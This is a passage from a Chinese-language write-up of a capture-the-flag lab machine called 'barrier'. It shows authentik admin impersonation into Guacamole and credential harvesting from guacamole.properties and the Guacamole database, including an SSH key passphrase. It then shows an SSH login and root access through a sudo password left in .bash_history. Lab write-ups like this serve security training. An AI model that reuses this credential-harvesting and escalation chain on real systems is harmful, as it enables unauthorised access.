      "uid": "2698567113c1ff76765c3baaa33db04c022784564d91d0c65ef03f41961282cf",
      "path": "goauthentik.io/outposts",
      "type": "internal_service_account",
      "uuid": "3737be82-3c55-4195-b639-478c339edb35"
    },
    {
      "pk": 4,
      "username": "akadmin",
      "name": "authentik Default Admin",
      "is_active": true,
      "last_login": "2025-06-18T09:25:04.724776Z",
      "is_superuser": true,
      "groups": [
        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8"
      ],
      "groups_obj": [
        {
          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
          "num_pk": 21741,
          "name": "authentik Admins",
          "is_superuser": true,
          "parent": null,
          "parent_name": null,
          "attributes": {}
        }
      ],
      "email": "admin@barrier.vl",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742",
      "path": "users",
      "type": "internal",
      "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5"
    },
    {
      "pk": 35,
      "username": "maki",
      "name": "maki",
      "is_active": true,
      "last_login": null,
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651",
      "path": "users",
      "type": "internal",
      "uuid": "5840e7f6-f396-493a-b41d-9433df6df996"
    },
    {
      "pk": 34,
      "username": "satoru",
      "name": "satoru",
      "is_active": true,
      "last_login": "2026-04-02T07:52:51.177022Z",
      "is_superuser": false,
      "groups": [],
      "groups_obj": [],
      "email": "satoru@barrier.vl",
      "avatar": "<SNIP>",
      "attributes": {},
      "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb",
      "path": "users",
      "type": "internal",
      "uuid": "91da4edd-f03d-4cdc-80af-102371b10905"
    },
    {
      "pk": 36,
      "username": "superadmin",
      "name": "superadmin",
      "is_active": true,
      "last_login": null,
      "is_superuser": true,
      "groups": [
        "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8"
      ],
      "groups_obj": [
        {
          "pk": "a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8",
          "num_pk": 21741,
          "name": "authentik Admins",
          "is_superuser": true,
          "parent": null,
          "parent_name": null,
          "attributes": {}
        }
      ],
      "email": "",
      "avatar": "SNIP>",
      "attributes": {},
      "uid": "0e89e359cf32c3efeecb057458a53528a5b799dd5067d7915bd7a15e082dbb74",
      "path": "users",
      "type": "internal",
      "uuid": "34d6027a-4477-4757-8312-279b20f52d95"
    }
  ]
}
```
</details>

#### 这意味着我们现在可以以超级用户身份通过以下网址登录到 Authentik：https://barrier.vl:9443 
![图片](images/2026040212.png)
#### 在仪表板的右上角，我们应该能够看到“Admin interface”
#### Directory -> Users
#### 看来我们能够冒充用户并获取他们的权限。仔细查看了每一个用户后，maki 似乎是唯一值得冒充的对象，因为他们在“Guacamole ”系统中有访问权限，而且该系统中已有连接存在。
#### 点击 maki的‘Impersonate'
![图片](images/2026040213.png)
#### 点击 ‘Guacamole',找到终端‘>_ Maintenance'
```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-168-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Apr  2 09:59:38 AM UTC 2026

  System load:  0.1                Processes:             311
  Usage of /:   77.1% of 14.17GB   Users logged in:       0
  Memory usage: 68%                IPv4 address for eth0: 10.129.234.46
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

18 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

maki@barrier:~$ cat user.txt
```
### Privilege Escalation
```
maki@barrier:/etc/guacamole$ ls -la
total 20
drwxr-xr-x   4 root root 4096 Dec 26  2024 .
drwxr-xr-x 111 root root 4096 Feb  2 11:08 ..
drwxr-xr-x   2 root root 4096 Dec 22  2024 extensions
-rw-r--r--   1 root root  703 Dec 26  2024 guacamole.properties
drwxr-xr-x   2 root root 4096 Dec 22  2024 lib
maki@barrier:/etc/guacamole$ ^C
maki@barrier:/etc/guacamole$ cat guacamole.properties
# MySQL properties
mysql-hostname: 127.0.0.1
mysql-port: 3306
mysql-database: guac_db
mysql-username: guac_user
mysql-password: guac2024
<SNIP>
```
#### 让我们连接到“guac_db”数据库，看看能否找到任何有用的信息。
```
maki@barrier:/etc/guacamole$ mysql -u guac_user -pguac2024 guac_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [guac_db]>
```
#### 让我们列出现有的表格
```
MariaDB [guac_db]> show tables;
+---------------------------------------+
| Tables_in_guac_db                     |
+---------------------------------------+
| guacamole_connection                  |
| guacamole_connection_attribute        |
| guacamole_connection_group            |
| guacamole_connection_group_attribute  |
| guacamole_connection_group_permission |
| guacamole_connection_history          |
| guacamole_connection_parameter        |
| guacamole_connection_permission       |
| guacamole_entity                      |
| guacamole_sharing_profile             |
| guacamole_sharing_profile_attribute   |
| guacamole_sharing_profile_parameter   |
| guacamole_sharing_profile_permission  |
| guacamole_system_permission           |
| guacamole_user                        |
| guacamole_user_attribute              |
| guacamole_user_group                  |
| guacamole_user_group_attribute        |
| guacamole_user_group_member           |
| guacamole_user_group_permission       |
| guacamole_user_history                |
| guacamole_user_password_history       |
| guacamole_user_permission             |
+---------------------------------------+
23 rows in set (0.000 sec)
```
#### 浏览这些表格后可以发现，其中包含最有用信息的表格是“guacamole_connection_parameter”，因为它包含了“maki_adm”的私钥和密码。
```
MariaDB [guac_db]> select * from guacamole_connection_parameter;
| connection_id | parameter_name | parameter_value
|             1 | port           | 22
|             2 | passphrase     | 3V32FN6oViMPxyzC
|             2 | port           | 22
|             2 | private-key    | -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,641356448A934274F5411C859C1FE00F
<SNIP>
-----END RSA PRIVATE KEY-----
|             2 | username       | maki_adm      
```
#### 现在我们可以尝试使用密钥和密码“3V32FN6oViMPxyzC”通过 SSH 进行连接
```
[★]$ chmod 600 maki_adm

[★]$ ssh -i maki_adm maki_adm@barrier.vl -oHostKeyAlgorithms=+ssh-rsa 
The authenticity of host 'barrier.vl (10.129.234.46)' can't be established.
RSA key fingerprint is SHA256:GCkGAQTxizCkIcpuBSCr79rJ/Al5wn745cwFDs+dY4A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'barrier.vl' (RSA) to the list of known hosts.
Enter passphrase for key 'maki_adm': 
<SNIP>
maki_adm@barrier:~$
```
#### 由于我们已经成功连接成功，首先我们注意到的是，.bash_history 文件中包含了一些数据
```
maki_adm@barrier:~$ ls -la
total 32
drwxr-x--- 4 maki_adm admin 4096 Dec 22  2024 .
drwxr-xr-x 5 root     root  4096 Dec 23  2024 ..
-rw-r--r-- 1 root     root    26 Dec 22  2024 .bash_history
-rw-r--r-- 1 maki_adm admin  220 Dec 22  2024 .bash_logout
-rw-r--r-- 1 maki_adm admin 3771 Dec 22  2024 .bashrc
drwx------ 2 maki_adm admin 4096 Dec 22  2024 .cache
-rw-r--r-- 1 maki_adm admin  807 Dec 22  2024 .profile
drwxrwxr-x 2 maki_adm admin 4096 Dec 22  2024 .ssh
-rw-r--r-- 1 maki_adm admin    0 Dec 22  2024 .sudo_as_admin_successful
```
#### ...
```
maki_adm@barrier:~$ cat .bash_history
sudo su 
Va4kSjgTHSd55ZLv

maki_adm@barrier:~$ sudo su
[sudo] password for maki_adm: 
root@barrier:/home/maki_adm#
root@barrier:~# cat root.txt
```
__________________
### 遇到的困难：
#### [1]使用burpsuite好难拦截到GET的SAMLResponse，但是网页上的Fn12就很简单就有了SAMLResponse了
![图片](images/2026040108.png)
#### [2]得到两个cookie后，找不到输入的地方，原来是不要froward,在新的登录页面输入就会变得很简单
